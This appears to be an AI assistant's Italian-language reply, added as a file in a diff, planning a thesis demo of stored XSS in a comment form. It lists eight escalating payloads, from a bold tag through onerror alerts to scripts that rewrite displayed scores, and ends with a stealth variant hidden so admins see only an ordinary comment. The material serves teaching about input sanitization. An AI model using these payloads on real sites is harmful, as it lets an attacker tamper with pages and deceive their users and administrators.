@@ -1,0 +1,134 @@
+Perfetto 😎
+Ti preparo una **scaletta step-by-step** che simula il percorso tipico di un attaccante quando scopre un form commenti vulnerabile a XSS. È ideale per una demo didattica perché mostri l’approccio “scientifico”: partire soft, poi aumentare fino all’attacco vero.
+
+---
+
+## 🔎 **Scaletta degli esperimenti XSS (per la demo)**
+
+### **Step 1 – Inserimento innocuo**
+
+Scopo: verificare se l’HTML viene renderizzato.
+
+```html
+<b>ciao</b>
+```
+
+* Se appare “ciao” in **grassetto**, vuol dire che l’HTML non viene filtrato.
+* Commento visivamente innocuo, poco sospetto.
+
+---
+
+### **Step 2 – Inserimento con caratteri speciali**
+
+Scopo: capire se ci sono trasformazioni o escaping.
+
+```html
+< > " ' &
+```
+
+* Se vengono mostrati **come caratteri**, c’è escaping.
+* Se `<` viene interpretato, hai conferma che il browser legge tag crudi.
+
+---
+
+### **Step 3 – Tag neutro**
+
+Scopo: vedere se tag non testuali sono accettati.
+
+```html
+<img src="x" alt="test">
+```
+
+* Se compare l’icona immagine rotta, il tag `<img>` non è filtrato.
+* Ancora nessun effetto strano, quindi poco “sospetto”.
+
+---
+
+### **Step 4 – Tag invisibile**
+
+Scopo: verificare se l’attributo `style` passa.
+
+```html
+<img src="x" style="display:none">
+```
+
+* Nulla appare visivamente → per l’admin sembra un normale commento vuoto.
+* Per l’attaccante: conferma che anche gli attributi CSS passano.
+
+---
+
+### **Step 5 – Micro-payload silenzioso**
+
+Scopo: provare se gli eventi vengono interpretati.
+
+```html
+<img src="x" onerror="console.log('XSS test')">
+```
+
+* Nessun popup per non destare sospetti.
+* L’attaccante controlla la console → se appare “XSS test”, vulnerabilità confermata.
+
+---
+
+### **Step 6 – Micro-payload rumoroso**
+
+Scopo: dimostrazione palese al pubblico.
+
+```html
+<img src="x" onerror="alert('XSS!')">
+```
+
+* Popup visibile → XSS in azione.
+* Ottimo come highlight per la presentazione.
+
+---
+
+### **Step 7 – Attacco mirato**
+
+Scopo: cambiare i punteggi sulla pagina.
+
+```html
+<script>
+  document.querySelectorAll('.score')
+          .forEach(el => el.textContent = '99 - 0');
+</script>
+```
+
+* Ora lo spettatore vede l’effetto reale → la manipolazione dei dati dell’app.
+
+---
+
+### **Step 8 – Attacco stealth**
+
+Scopo: commento “normale” lato admin, ma attivo lato utente.
+
+```html
+che partita!!!<img src=x style="display:none" 
+  onerror="document.querySelectorAll('.score')
+                  .forEach(el => el.textContent='99 - 0')">
+```
+
+* Admin vede solo “che partita!!!”.
+* Lato utente, il codice JS viene eseguito in background.
+
+---
+
+## 🎬 Consiglio per la tesi
+
+Puoi proprio mostrare la **progressione live**:
+
+* Fai vedere il commento in bold → innocuo.
+* Poi l’immagine rotta.
+* Poi il `console.log`.
+* Poi il popup.
+* Infine la manipolazione dei punteggi e la versione invisibile.
+
+Così dimostri bene:
+
+1. Il **metodo dell’attaccante**.
+2. L’impatto concreto sul sito.
+3. Perché la sanitizzazione lato server è fondamentale.
+
+---
+
+Vuoi che ti prepari anche una **tabellina riassuntiva** (payload → obiettivo → visibilità lato admin/utente), che potresti mettere direttamente nelle slide di tesi?
